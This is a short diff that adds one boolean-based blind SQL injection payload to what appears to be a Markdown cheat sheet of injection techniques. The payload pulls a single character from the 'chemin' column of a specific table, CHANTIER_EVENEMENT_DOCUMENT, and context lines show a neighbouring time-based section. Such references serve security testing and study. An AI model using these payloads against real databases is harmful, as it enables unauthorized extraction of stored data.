@@ -291,6 +291,10 @@ AND (
 ) = 'a'
 ```
 
+```
+AND (SELECT substr(chemin,1,1) FROM CHANTIER_EVENEMENT_DOCUMENT WHERE nom_fichier='test.txt')= 'a' --
+```
+
 Time Based:
 ```
 1 AND IF(
